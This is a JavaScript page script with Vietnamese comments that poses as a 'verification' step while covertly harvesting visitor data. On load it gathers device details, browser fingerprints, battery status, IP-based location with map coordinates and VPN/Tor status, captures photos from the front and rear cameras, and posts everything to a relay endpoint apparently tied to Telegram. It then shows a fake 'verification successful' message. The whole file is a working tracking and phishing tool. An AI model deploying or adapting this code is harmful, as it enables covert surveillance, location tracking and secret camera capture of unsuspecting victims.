// main.js - Phiên bản siêu đầy đủ - Thu thập mọi thông tin có thể

const API_PROXY = '/api/tele-proxy';

// Object chứa TẤT CẢ thông tin
const info = {
  // Thời gian
  time: new Date().toLocaleString('vi-VN'),
  timestamp: Date.now(),
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  
  // Thiết bị cơ bản
  device: '',
  device_model: '',
  os: '',
  os_version: '',
  browser: '',
  browser_version: '',
  
  // Màn hình
  screen_width: window.screen.width,
  screen_height: window.screen.height,
  screen_color_depth: window.screen.colorDepth,
  screen_pixel_ratio: window.devicePixelRatio || 1,
  window_width: window.innerWidth,
  window_height: window.innerHeight,
  
  // Trình duyệt & Ngôn ngữ
  user_agent: navigator.userAgent,
  language: navigator.language,
  languages: navigator.languages ? navigator.languages.join(', ') : '',
  platform: navigator.platform,
  
  // Kết nối
  connection_type: navigator.connection ? navigator.connection.effectiveType : 'Không xác định',
  connection_downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Không xác định',
  connection_rtt: navigator.connection ? navigator.connection.rtt + 'ms' : 'Không xác định',
  
  // Pin (nếu có)
  battery_level: 'Đang lấy...',
  battery_charging: 'Đang lấy...',
  
  // Bộ nhớ
  device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Không xác định',
  hardware_concurrency: navigator.hardwareConcurrency || 'Không xác định',
  
  // IP và vị trí
  ip: 'Đang lấy...',
  ip_resident: 'Đang lấy...',  // IP dân cư (giống IP gốc thường)
  ip_original: 'Đang lấy...',
  isp: 'Đang lấy...',
  organization: 'Đang lấy...',
  country: 'Đang lấy...',
  country_code: 'Đang lấy...',
  region: 'Đang lấy...',
  region_name: 'Đang lấy...',
  city: 'Đang lấy...',
  zip: 'Đang lấy...',
  latitude: 'Đang lấy...',
  longitude: 'Đang lấy...',
  location_full: 'Đang lấy...',
  google_maps: '',
  
  // Camera
  camera: '⏳ Đang kiểm tra...',
  camera_front: false,
  camera_back: false,
  
  // DNS và mạng
  dns_servers: 'Đang lấy...',
  
  // Canvas Fingerprint
  canvas_fingerprint: 'Đang lấy...',
  
  // WebGL Fingerprint
  webgl_vendor: 'Đang lấy...',
  webgl_renderer: 'Đang lấy...',
  
  // Audio Fingerprint
  audio_fingerprint: 'Đang lấy...',
  
  // Plugins
  plugins: [],
  
  // Có đang dùng VPN/Proxy không
  is_vpn: 'Đang kiểm tra...',
  is_proxy: 'Đang kiểm tra...',
  is_tor: 'Đang kiểm tra...',
  
  // In-app browser check
  is_inapp_browser: false,
  inapp_name: '',
  
  // Ghi chú
  note: 'Thông tin có thể không chính xác 100%'
};

// --- 1. NHẬN DIỆN THIẾT BỊ CHI TIẾT ---
function detectDeviceDetailed() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio || 1;

  // Nhận diện trình duyệt
  if (ua.includes('Chrome') && !ua.includes('Edg')) {
    info.browser = 'Chrome';
    const match = ua.match(/Chrome\/(\d+)/);
    info.browser_version = match ? match[1] : 'Không xác định';
  } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
    info.browser = 'Safari';
    const match = ua.match(/Version\/(\d+)/);
    info.browser_version = match ? match[1] : 'Không xác định';
  } else if (ua.includes('Firefox')) {
    info.browser = 'Firefox';
    const match = ua.match(/Firefox\/(\d+)/);
    info.browser_version = match ? match[1] : 'Không xác định';
  } else if (ua.includes('Edg')) {
    info.browser = 'Edge';
    const match = ua.match(/Edg\/(\d+)/);
    info.browser_version = match ? match[1] : 'Không xác định';
  } else {
    info.browser = 'Khác';
    info.browser_version = 'Không xác định';
  }

  // Nhận diện thiết bị
  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
    info.device_model = info.device;
    
    // Lấy version iOS
    const iosMatch = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
    info.os_version = iosMatch ? `${iosMatch[1]}.${iosMatch[2]}` : 'Không xác định';
    
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android\s+([\d.]+)/);
    info.os_version = match ? match[1] : 'Không xác định';
    const deviceMatch = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = deviceMatch ? deviceMatch[1].split('/')[0].trim() : 'Android Device';
    info.device_model = info.device;
  } else if (ua.includes('Windows')) {
    info.os = 'Windows';
    const winMatch = ua.match(/Windows NT ([\d.]+)/);
    const winVersions = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
    info.os_version = winMatch ? winVersions[winMatch[1]] || winMatch[1] : 'Không xác định';
    info.device = 'PC/Laptop';
    info.device_model = 'Windows Computer';
  } else if (ua.includes('Mac')) {
    info.os = 'macOS';
    info.os_version = 'Không xác định';
    info.device = 'Mac';
    info.device_model = 'Apple Mac';
  } else {
    info.os = 'Desktop';
    info.os_version = 'Không xác định';
    info.device = platform || 'PC/Laptop';
    info.device_model = info.device;
  }

  // Kiểm tra in-app browser
  const isTikTok = /TikTok|musical_ly|ByteLocale/i.test(ua);
  const isFacebook = /FBAN|FBAV/i.test(ua);
  const isInstagram = /Instagram/i.test(ua);
  const isZalo = /Zalo/i.test(ua);
  const isMessenger = /Messenger/i.test(ua);
  
  if (isTikTok) {
    info.is_inapp_browser = true;
    info.inapp_name = 'TikTok';
  } else if (isFacebook) {
    info.is_inapp_browser = true;
    info.inapp_name = 'Facebook';
  } else if (isInstagram) {
    info.is_inapp_browser = true;
    info.inapp_name = 'Instagram';
  } else if (isZalo) {
    info.is_inapp_browser = true;
    info.inapp_name = 'Zalo';
  } else if (isMessenger) {
    info.is_inapp_browser = true;
    info.inapp_name = 'Messenger';
  } else {
    info.is_inapp_browser = false;
    info.inapp_name = '';
  }
}

// --- 2. LẤY THÔNG TIN BATTERY ---
async function getBatteryInfo() {
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      info.battery_level = Math.round(battery.level * 100) + '%';
      info.battery_charging = battery.charging ? 'Đang sạc' : 'Không sạc';
    } catch(e) {
      info.battery_level = 'Không xác định';
      info.battery_charging = 'Không xác định';
    }
  } else {
    info.battery_level = 'Không hỗ trợ';
    info.battery_charging = 'Không hỗ trợ';
  }
}

// --- 3. LẤY DANH SÁCH PLUGINS ---
function getPlugins() {
  if (navigator.plugins && navigator.plugins.length > 0) {
    info.plugins = Array.from(navigator.plugins).map(p => p.name);
  } else {
    info.plugins = ['Không có hoặc không hỗ trợ'];
  }
}

// --- 4. CANVAS FINGERPRINT ---
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200;
    canvas.height = 50;
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.font = '14px Arial';
    ctx.fillText('Canvas Fingerprint Test', 10, 30);
    info.canvas_fingerprint = canvas.toDataURL().substring(0, 100) + '...';
  } catch(e) {
    info.canvas_fingerprint = 'Lỗi: ' + e.message;
  }
}

// --- 5. WEBGL FINGERPRINT ---
function getWebGLInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        info.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        info.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } else {
        info.webgl_vendor = 'Không thể lấy';
        info.webgl_renderer = 'Không thể lấy';
      }
    } else {
      info.webgl_vendor = 'WebGL không hỗ trợ';
      info.webgl_renderer = 'WebGL không hỗ trợ';
    }
  } catch(e) {
    info.webgl_vendor = 'Lỗi: ' + e.message;
    info.webgl_renderer = 'Lỗi: ' + e.message;
  }
}

// --- 6. AUDIO FINGERPRINT ---
async function getAudioFingerprint() {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    oscillator.connect(analyser);
    analyser.connect(audioContext.destination);
    oscillator.start(0);
    const data = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(data);
    const fingerprint = Array.from(data).slice(0, 10).join('');
    info.audio_fingerprint = fingerprint || 'Không xác định';
    oscillator.stop();
    audioContext.close();
  } catch(e) {
    info.audio_fingerprint = 'Không hỗ trợ';
  }
}

// --- 7. LẤY IP VÀ ĐỊNH VỊ SIÊU CHI TIẾT ---
async function getDetailedGeoInfo() {
  try {
    // Dùng ipapi.co (nhiều thông tin)
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    
    if (data.ip) {
      info.ip = data.ip;
      info.ip_resident = data.ip;
      info.ip_original = data.ip;
      info.isp = data.org || data.asn || 'Không xác định';
      info.organization = data.org || 'Không xác định';
      info.country = data.country_name || 'Không xác định';
      info.country_code = data.country_code || 'Không xác định';
      info.region = data.region || 'Không xác định';
      info.region_name = data.region || 'Không xác định';
      info.city = data.city || 'Không xác định';
      info.zip = data.postal || 'Không xác định';
      info.latitude = data.latitude || 'Không xác định';
      info.longitude = data.longitude || 'Không xác định';
      info.location_full = `${info.city}, ${info.region}, ${info.country}`;
      
      if (data.latitude && data.longitude) {
        info.google_maps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
      }
      
      // Kiểm tra VPN/Proxy (dựa trên các chỉ số)
      if (data.proxy || data.tor || data.vpn) {
        info.is_vpn = 'Có thể';
        info.is_proxy = data.proxy ? 'Có' : 'Không';
        info.is_tor = data.tor ? 'Có' : 'Không';
      } else {
        info.is_vpn = 'Không phát hiện';
        info.is_proxy = 'Không';
        info.is_tor = 'Không';
      }
    } else {
      throw new Error('ipapi.co thất bại');
    }
  } catch (e) {
    console.log('Fallback sang ip-api.com...');
    try {
      const res2 = await fetch('http://ip-api.com/json/');
      const data2 = await res2.json();
      if (data2.status === 'success') {
        info.ip = data2.query;
        info.ip_resident = data2.query;
        info.ip_original = data2.query;
        info.isp = data2.isp;
        info.organization = data2.org || data2.isp;
        info.country = data2.country;
        info.country_code = data2.countryCode;
        info.region = data2.region;
        info.region_name = data2.regionName;
        info.city = data2.city;
        info.zip = data2.zip;
        info.latitude = data2.lat;
        info.longitude = data2.lon;
        info.location_full = `${data2.city}, ${data2.regionName}, ${data2.country}`;
        info.google_maps = `https://www.google.com/maps?q=${data2.lat},${data2.lon}`;
        info.is_vpn = 'Không xác định';
        info.is_proxy = 'Không xác định';
        info.is_tor = 'Không xác định';
      }
    } catch(e2) {
      info.ip = 'Không xác định';
      info.ip_resident = 'Không xác định';
      info.ip_original = 'Không xác định';
      info.isp = 'Không xác định';
      info.organization = 'Không xác định';
      info.country = 'Không xác định';
      info.location_full = 'Không xác định';
    }
  }
}

// --- 8. CHỤP ẢNH CAMERA ---
async function captureCamera(facingMode = 'user') {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
        }, 500);
      };
    });
  } catch (e) {
    console.log('Lỗi capture:', e);
    return null;
  }
}

// --- 9. KIỂM TRA DNS (đơn giản) ---
async function checkDNS() {
  try {
    const img = new Image();
    const start = Date.now();
    img.src = 'https://1.1.1.1/favicon.ico?' + Date.now();
    await new Promise(resolve => { img.onload = resolve; img.onerror = resolve; setTimeout(resolve, 2000); });
    const end = Date.now();
    info.dns_servers = `DNS response: ${end - start}ms`;
  } catch(e) {
    info.dns_servers = 'Không kiểm tra được';
  }
}

// --- 10. HÀM CHÍNH ---
async function main() {
  console.log("🚀 Bắt đầu thu thập thông tin siêu đầy đủ...");
  
  const button = document.querySelector('button') || document.querySelector('.btn');
  
  // Thu thập tất cả thông tin
  detectDeviceDetailed();
  getPlugins();
  getCanvasFingerprint();
  getWebGLInfo();
  await getBatteryInfo();
  await getAudioFingerprint();
  await getDetailedGeoInfo();
  await checkDNS();
  
  console.log("📱 Thiết bị:", info.device, "-", info.os, info.os_version);
  console.log("🌍 IP:", info.ip, "-", info.location_full);
  
  // Chụp ảnh
  let front = await captureCamera("user");
  let back = await captureCamera("environment");
  
  info.camera_front = !!front;
  info.camera_back = !!back;
  info.camera = (front || back) ? '✅ Đã chụp camera trước và sau' : '🚫 Bị chặn hoặc không có camera';
  
  // Gửi dữ liệu
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));
  
  if (front) formData.append('front', front, 'front.jpg');
  if (back) formData.append('back', back, 'back.jpg');
  
  try {
    await fetch(API_PROXY, { method: 'POST', body: formData });
    console.log("✅ Đã gửi dữ liệu thành công");
  } catch(e) {
    console.log("⚠️ Lỗi gửi:", e);
  }
  
  // Cập nhật giao diện
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    button.innerText = `✅ XÁC THỰC THÀNH CÔNG`;
  }
  
  window.mainScriptFinished = true;
  console.log("✅ Đã thu thập xong tất cả thông tin!");
}

// Chạy main
main();
